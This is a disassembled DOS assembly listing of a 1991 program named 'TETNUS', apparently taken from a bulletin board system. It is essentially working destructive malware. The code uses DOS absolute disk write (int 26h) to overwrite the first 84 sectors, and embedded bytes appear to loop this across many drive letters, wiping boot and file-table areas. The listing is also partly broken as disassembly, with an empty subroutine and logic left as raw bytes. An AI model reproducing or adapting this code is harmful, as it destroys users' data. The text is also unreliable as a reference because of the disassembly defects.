

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        TETNUS				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   26-Jan-91					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: H		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
  
;--------------------------------------------------------------	seg_a  ----
  
seg_a		segment	para public
		assume cs:seg_a , ds:seg_a
  
		db	256 dup (0)
		db	0B0h, 2, 0E8h, 1Dh, 0, 0B0h
		db	3, 0E8h, 18h, 0, 0B0h, 0
		db	0E8h, 13h, 0, 0B0h, 1, 0E8h
		db	0Eh, 0, 0B9h, 16h, 0, 0B0h
		db	3
  
locloop_1:
		inc	al
		call	sub_1			; (0122)
		loop	locloop_1		; Loop if cx > 0
  
		int	20h			; Program Terminate
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
sub_1		endp
  
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			program entry point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
  
tetnus		proc	far
  
start:
		mov	cx,54h
		mov	dx,0
		mov	bx,cs
		mov	ds,bx
		mov	bx,0
		push	ax
		push	bx
		push	cx
		push	dx
		int	26h			; Absolute disk write, drive al
		popf				; Pop flags
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
  
tetnus		endp
  
seg_a		ends
  
  
  
		end	start

Downloaded From P-80 International Information Systems 304-744-2253

